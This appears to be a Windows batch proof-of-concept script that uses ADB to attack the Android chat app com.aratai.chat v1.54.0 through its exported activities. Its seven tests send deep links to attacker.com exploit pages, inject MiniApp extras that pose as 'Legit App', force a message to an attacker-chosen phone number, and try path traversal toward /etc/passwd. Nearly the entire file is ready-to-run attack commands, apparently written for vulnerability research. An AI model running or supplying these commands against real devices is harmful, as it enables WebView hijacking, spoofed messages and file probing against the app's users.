@echo off
REM ============================================================
REM Arattai Deep Link / WebView PoC - ADB Commands
REM Target: com.aratai.chat v1.54.0
REM ============================================================

set ADB=adb -s emulator-5554

echo.
echo ====== TEST 1: Deep Link via ContactAction (exported, no permission) ======
echo Sending attacker-controlled URL through unprotected activity alias...
%ADB% shell am start -n com.aratai.chat/com.zoho.chat.ContactAction -a android.intent.action.VIEW -d "https://attacker.com/poc.html"
timeout /t 3

echo.
echo ====== TEST 2: Deep Link via ExternalEntryPointActivity (direct) ======
%ADB% shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity -a android.intent.action.VIEW -d "https://web.arattai.in/test?redirect=https://attacker.com"
timeout /t 3

echo.
echo ====== TEST 3: Generic HTTPS scheme handler ======
%ADB% shell am start -W -a android.intent.action.VIEW -d "https://attacker.com/webview_exploit.html" com.aratai.chat
timeout /t 3

echo.
echo ====== TEST 4: Intent with MiniApp extras ======
%ADB% shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity -a android.intent.action.VIEW -d "https://web.arattai.in/" --es "link" "https://attacker.com/webview_exploit.html" --es "miniAppId" "evil_app" --es "name" "Legit App"
timeout /t 3

echo.
echo ====== TEST 5: Send message action with attacker phone ======
%ADB% shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity -a "com.arattai.intent.action.SendTextMessageAction" --es "com.arattai.intent.extra.PHONE_NUMBER" "+1234567890" --es "com.arattai.intent.extra.TEXT" "Attacker-injected message"
timeout /t 3

echo.
echo ====== TEST 6: Aratt.ai short URL with path injection ======
%ADB% shell am start -W -a android.intent.action.VIEW -d "https://aratt.ai/../../../etc/passwd" com.aratai.chat
timeout /t 3

echo.
echo ====== TEST 7: Meeting link injection ======
%ADB% shell am start -W -a android.intent.action.VIEW -d "https://meet.arattai.in/../../attacker-meeting" com.aratai.chat
timeout /t 3

echo.
echo ====== All tests complete. Check device screen for results. ======
pause
